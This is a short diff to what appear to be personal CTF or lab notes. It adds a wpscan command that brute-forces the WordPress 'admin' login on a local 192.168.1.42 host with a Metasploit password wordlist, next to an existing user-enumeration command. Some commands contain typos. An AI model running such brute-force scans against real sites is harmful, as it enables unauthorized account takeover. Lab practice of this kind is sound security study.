@@ -63,6 +63,13 @@ Back to PinkManner Wifi
 
 `wpscan --url http"//192.168.1.42:8585/wordpress/ | -e u1-5`
 
+-----
+look into `/usr/share/wordlists`
+
+`wpscan --passwords /usr/share/wordlists/metaspoint/unix_passwords.txt --usernames admin -- url http://192.168.1.42:8585/wordpress/`
+
+-----
+
 
 
 
